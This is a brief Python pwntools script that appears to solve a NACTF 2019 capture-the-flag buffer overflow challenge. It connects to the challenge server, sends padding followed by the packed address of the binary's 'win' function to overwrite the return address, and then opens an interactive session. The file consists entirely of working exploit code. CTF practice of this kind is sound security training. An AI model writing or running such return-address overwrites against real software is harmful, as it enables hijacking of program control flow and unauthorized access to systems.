from pwn import *

p = remote("shell.2019.nactf.com", 31475)
#p = process("./buf")

e = ELF("./buf")
p.sendline("A" * 0x18 + "A" * 4 + p32(e.symbols["win"])) 

p.interactive()
